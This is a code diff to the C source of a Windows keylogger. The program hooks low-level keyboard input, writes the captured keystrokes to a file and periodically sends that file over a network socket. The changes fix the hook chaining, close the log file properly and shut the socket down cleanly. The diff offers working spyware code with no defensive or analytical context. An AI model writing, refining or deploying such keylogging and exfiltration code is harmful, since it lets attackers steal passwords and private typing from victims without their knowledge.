@@ -117,6 +117,8 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wparam, LPARAM lparam)
 	size_t			  i = 0;
 	static int		  shift;
 
+	if (nCode < 0)
+		return (CallNextHookEx(handlekeyboard, nCode, wparam, lparam));
 	kb = (LPKBDLLHOOKSTRUCT)lparam;
 	for (i = 0; keyboard[i].code != kb->vkCode && keyboard[i].code != 0; i++);
 	if ((keyboard[i].code == VK_LSHIFT && wparam == WM_KEYDOWN && shift == 0) || (keyboard[i].code == VK_CAPITAL && wparam == WM_KEYDOWN && (shift == 0)))
@@ -149,7 +151,6 @@ void	setwinhook()
 	CloseHandle(process.hProcess);
 	CloseHandle(process.hThread);
 #endif // 0
-
 }
 
 void	save_data(const char *data)
@@ -177,10 +178,9 @@ void	save_data(const char *data)
 	if (countTime > 5)
 	{
 		countTime = 0;
-		printf("coucou je suis dans le count time\n");
-		//if (fclose(file) != 0)
-			//_wperror(L" Close file failed ");
 		send_data(my_sock, file);
+		if (fclose(file) != 0)
+			_wperror(L"Close file failed");
 		if (_wfopen_s(&file, L"test.txt", L"w+") != 0)
 			_wperror(L" Open file failed ");
 	}
@@ -200,10 +200,20 @@ int	main(void)
 	setwinhook();				
 	while (GetMessage(&msg, NULL, 0, 0))
 	{
+		if (PeekMessage(&msg, NULL, WM_CLOSE, WM_CLOSE, PM_NOREMOVE) == TRUE)
+		{
+			break;
+		}
 		TranslateMessage(&msg);
 		DispatchMessage(&msg);
 	}
 	UnhookWindowsHookEx(handlekeyboard);
+	if (shutdown(my_sock, SD_BOTH) == SOCKET_ERROR)
+	{
+		printf("failed shutdown\n");
+		closesocket(my_sock);
+		return;
+	}
 	closesocket(my_sock);
 	WSACleanup();
 	return (msg.wParam);
